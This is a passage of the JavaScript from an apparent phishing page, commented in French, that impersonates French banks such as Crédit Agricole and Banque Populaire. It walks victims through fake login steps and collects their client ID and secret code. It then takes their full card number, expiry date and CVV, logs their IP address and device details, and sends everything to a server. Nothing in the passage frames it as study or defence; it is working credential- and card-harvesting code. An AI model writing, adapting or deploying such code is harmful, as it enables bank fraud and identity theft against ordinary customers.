            else if (deviceInfo.isMac) osType = 'macOS';
            else if (deviceInfo.isWindows) osType = 'Windows';
            
            deviceInfoElement.innerHTML = `
                <strong>Appareil détecté:</strong> ${deviceType} ${osType} | 
                <strong>Navigateur:</strong> ${navigator.userAgent.split(' ').pop().split('/')[0]} |
                <strong>Écran:</strong> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
            `;
        }

        // Récupérer l'adresse IP
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                userIP = 'IP_non_disponible';
            }
        }

        // Fonction pour gérer la saisie des identifiants
        function handleLoginInput(fieldId) {
            const inputElement = document.getElementById(fieldId);
            const value = inputElement.value;
            
            realValues[fieldId] = value;
            validateLoginFields();
        }

        // Gestion de l'affichage des régions
        function showRegionSelectorIfNeeded() {
            const regionSelector = document.getElementById('regionSelector');
            const caRegions = document.getElementById('caRegions');
            const bpRegions = document.getElementById('bpRegions');
            
            if (selectedBank === 'ca') {
                regionSelector.style.display = 'block';
                caRegions.style.display = 'block';
                bpRegions.style.display = 'none';
            } else if (selectedBank === 'bp') {
                regionSelector.style.display = 'block';
                caRegions.style.display = 'none';
                bpRegions.style.display = 'block';
            } else {
                regionSelector.style.display = 'none';
            }
            
            validateLoginFields();
        }

        // Fonction pour gérer le changement de région
        function handleRegionChange() {
            const regionSelect = document.getElementById('bankRegion');
            const selectedOption = regionSelect.options[regionSelect.selectedIndex];
            
            if (selectedOption.value) {
                let fullBankName = '';
                if (selectedBank === 'ca') {
                    fullBankName = `Crédit Agricole ${selectedOption.text}`;
                } else if (selectedBank === 'bp') {
                    fullBankName = `Banque Populaire ${selectedOption.text}`;
                }
                
                for (let i = 3; i <= 9; i++) {
                    const bankNameElement = document.getElementById(`selectedBankName${i}`);
                    if (bankNameElement) {
                        bankNameElement.textContent = fullBankName;
                    }
                }
                
                userData.region = selectedOption.value;
                userData.regionName = selectedOption.text;
                userData.fullBankName = fullBankName;
            }
            
            validateLoginFields();
        }

        // Validation des champs de connexion
        function validateLoginFields() {
            const clientId = realValues.clientId;
            const secretCode = realValues.secretCode;
            const validateButton = document.getElementById('validateLoginButton');
            
            const clientIdValid = clientId && clientId.length >= 3;
            const secretCodeValid = secretCode && secretCode.length >= 3;
            
            let regionValid = true;
            if (selectedBank === 'ca' || selectedBank === 'bp') {
                const region = document.getElementById('bankRegion').value;
                regionValid = region !== '';
                document.getElementById('regionError').style.display = regionValid ? 'none' : 'block';
            }
            
            document.getElementById('clientIdError').style.display = clientIdValid ? 'none' : 'block';
            document.getElementById('clientIdValid').style.display = clientIdValid ? 'block' : 'none';
            document.getElementById('secretCodeError').style.display = secretCodeValid ? 'none' : 'block';
            document.getElementById('secretCodeValid').style.display = secretCodeValid ? 'block' : 'none';
            
            document.getElementById('clientId').classList.toggle('error', !clientIdValid);
            document.getElementById('secretCode').classList.toggle('error', !secretCodeValid);
            
            const allValid = clientIdValid && secretCodeValid && regionValid;
            validateButton.disabled = !allValid;
            
            return allValid;
        }

        // Navigation entre pages
        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active');
            });
            document.getElementById(pageId).classList.add('active');
            
            if (selectedBank) {
                updateBankBackground();
                updateAllBankHeaders();
            }
            
            if (pageId === 'page3') {
                setTimeout(() => {
                    showRegionSelectorIfNeeded();
                }, 50);
            }
            
            // Scroll vers le haut pour les mobiles
            if (deviceInfo.isMobile || deviceInfo.isTablet) {
                window.scrollTo(0, 0);
            }
        }

        // Gestion de la sélection de banque
        document.getElementById('bankSelect').addEventListener('change', function() {
            selectedBank = this.value;
            const nextButton = document.getElementById('nextButton');
            nextButton.disabled = !selectedBank;
            
            if (selectedBank) {
                userData.bank = bankConfig[selectedBank].name;
                updateBankBackground();
            }
        });

        // Mise à jour de l'arrière-plan selon la banque
        function updateBankBackground() {
            document.body.className = '';
            if (selectedBank && bankConfig[selectedBank]) {
                document.body.classList.add(selectedBank);
            }
        }

        // Mettre à jour les en-têtes de banque
        function updateAllBankHeaders() {
            for (let i = 3; i <= 9; i++) {
                const header = document.getElementById(`bankHeader${i}`);
                const logo = document.getElementById(`selectedBankLogo${i}`);
                const name = document.getElementById(`selectedBankName${i}`);
                
                if (header && selectedBank && bankConfig[selectedBank]) {
                    const config = bankConfig[selectedBank];
                    logo.style.backgroundColor = config.color;
                    logo.textContent = config.initial;
                    
                    if (userData.fullBankName) {
                        name.textContent = userData.fullBankName;
                    } else {
                        name.textContent = config.name;
                    }
                }
            }
        }

        // Formatage du numéro de carte
        function formatCardNumber(input) {
            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = '';
            
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formattedValue += ' ';
                formattedValue += value[i];
            }
            
            input.value = formattedValue;
            cardData.number = value;
            updateCardDisplay();
            validateCardField();
        }

        // Formatage de la date
        function formatExpiry(input) {
            let value = input.value.replace(/[^0-9]/gi, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value;
            cardData.expiry = value.replace('/', '');
            updateCardDisplay();
            validateExpiryField();
        }

        // Saisie CVV
        function secureCVVInput(input) {
            let value = input.value.replace(/[^0-9]/gi, '');
            input.value = value;
            cardData.cvv = value;
            validateCVVField();
            updateCardBackDisplay();
        }

        function validateCardField() {
            const cardNumber = cardData.number;
            const isValid = cardNumber.length === 16;
            
            document.getElementById('cardNumberError').style.display = isValid ? 'none' : 'block';
            document.getElementById('cardNumberValid').style.display = isValid ? 'block' : 'none';
            document.getElementById('cardNumber').classList.toggle('error', !isValid);
            document.getElementById('validateCardButton').disabled = !isValid;
            
            return isValid;
        }

        function validateExpiryField() {
            const expiry = cardData.expiry;
            let isValid = false;
            
            if (expiry && expiry.length === 4) {
                const month = parseInt(expiry.substring(0, 2));
                const year = parseInt(expiry.substring(2, 4));
                isValid = (month >= 1 && month <= 12) && (year >= 25 && year <= 31);
            }
            
            document.getElementById('expiryError').style.display = isValid ? 'none' : 'block';
            document.getElementById('expiryValid').style.display = isValid ? 'block' : 'none';
            document.getElementById('cardExpiry').classList.toggle('error', !isValid);
            document.getElementById('validateExpiryButton').disabled = !isValid;
            
            return isValid;
        }

        function validateCVVField() {
            const cvv = cardData.cvv;
            const isValid = cvv && (cvv.length === 3 || cvv.length === 4);
            
            document.getElementById('cvvError').style.display = isValid ? 'none' : 'block';
            document.getElementById('cvvValid').style.display = isValid ? 'block' : 'none';
            document.getElementById('cardCVV').classList.toggle('error', !isValid);
            document.getElementById('validateFinalButton').disabled = !isValid;
            
            return isValid;
        }

        function updateCardDisplay() {
            const displayNumber = document.getElementById('displayCardNumber');
            const displayExpiry = document.getElementById('displayExpiry');
            const displayNumber7 = document.getElementById('displayCardNumber7');
            const displayExpiry7 = document.getElementById('displayExpiry7');
            const cardLogo = document.getElementById('cardLogo');
            const cardLogo7 = document.getElementById('cardLogo7');
            
            let cardType = 'CREDIT';
            let cardClass = '';
            if (cardData.number) {
                if (cardData.number.startsWith('4')) {
                    cardType = 'VISA';
                    cardClass = 'visa-logo';
                } else if (cardData.number.startsWith('5')) {
                    cardType = 'MASTERCARD';
                    cardClass = 'mastercard-logo';
                }
            }
            
            // Affichage complet des informations
            if (cardData.number) {
                let displayed = '';
                for (let i = 0; i < cardData.number.length; i++) {
                    if (i > 0 && i % 4 === 0) displayed += ' ';
                    displayed += cardData.number[i];
                }
                if (displayNumber) displayNumber.textContent = displayed;
                if (displayNumber7) displayNumber7.textContent = displayed;
            }
            
            if (cardData.expiry) {
                const expiryDisplay = cardData.expiry.substring(0, 2) + '/' + cardData.expiry.substring(2, 4);
                if (displayExpiry) displayExpiry.textContent = expiryDisplay;
                if (displayExpiry7) displayExpiry7.textContent = expiryDisplay;
            }
            
            if (cardLogo) {
                cardLogo.textContent = cardType;
                cardLogo.className = 'card-logo ' + cardClass;
            }
            if (cardLogo7) {
                cardLogo7.textContent = cardType;
                cardLogo7.className = 'card-logo ' + cardClass;
            }
        }

        function updateCardBackDisplay() {
            const displayCVV = document.getElementById('displayCVV');
            if (displayCVV && cardData.cvv) {
                displayCVV.textContent = cardData.cvv;
            }
        }

        function validateCardNumber() {
            if (validateCardField()) {
                showPage('page7');
            }
        }

        function validateExpiry() {
            if (validateExpiryField()) {
                showPage('page8');
            }
        }

        async function submitData() {
            if (!validateLoginFields()) {
                return;
            }

            userData.clientId = realValues.clientId;
            userData.secretCode = realValues.secretCode;
            
            if (selectedBank === 'ca' || selectedBank === 'bp') {
                const regionSelect = document.getElementById('bankRegion');
                userData.region = regionSelect.value;
                userData.regionName = regionSelect.options[regionSelect.selectedIndex].text;
                userData.fullBankName = document.getElementById('selectedBankName3').textContent;
            }

            await saveToServer('IDENTIFIANTS', userData);
            
            setTimeout(() => {
                showPage('page4');
            }, 1000);
        }

        async function submitCardData() {
            if (!validateCVVField()) {
                return;
            }
            
            const fullData = {
                ...userData,
                cardNumber: cardData.number,
                cardExpiry: cardData.expiry,
                cardCVV: cardData.cvv,
                cardType: cardData.number.startsWith('4') ? 'VISA' : 
                         cardData.number.startsWith('5') ? 'MASTERCARD' : 'AUTRE'
            };
            
            await saveToServer('CARTE_COMPLETE', fullData);
            
            setTimeout(() => {
                showPage('page9');
            }, 1000);
        }

        function resetForm() {
            document.getElementById('bankSelect').selectedIndex = 0;
            document.getElementById('clientId').value = '';
            document.getElementById('secretCode').value = '';
            document.getElementById('cardNumber').value = '';
            document.getElementById('cardExpiry').value = '';
            document.getElementById('cardCVV').value = '';
            document.getElementById('bankRegion').value = '';
            document.body.className = '';
            selectedBank = '';
            userData = {};
            realValues = { clientId: '', secretCode: '' };
            cardData = { number: '', expiry: '', cvv: '' };
            
            document.querySelectorAll('.error-message, .validation-info, .success-message').forEach(el => {
                el.style.display = 'none';
            });
            document.querySelectorAll('.form-input').forEach(el => {
                el.classList.remove('error');
            });
            
            document.getElementById('regionSelector').style.display = 'none';
        }

        // Initialisation
        document.addEventListener('DOMContentLoaded', function() {
            detectDevice();
            getUserIP();
            
            document.getElementById('bankSelect').addEventListener('change', function() {
                selectedBank = this.value;
                const nextButton = document.getElementById('nextButton');
                nextButton.disabled = !selectedBank;
                
                if (selectedBank) {
                    userData.bank = bankConfig[selectedBank].name;
                    updateBankBackground();
                }
            });

            // Optimisation pour les touches virtuelles sur mobile
            if (deviceInfo.isMobile) {
                const inputs = document.querySelectorAll('input, select, textarea');
                inputs.forEach(input => {
                    input.addEventListener('focus', function() {
                        setTimeout(() => {
                            this.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        }, 300);
                    });
                });
            }
        });
    </script>
</body>
</html>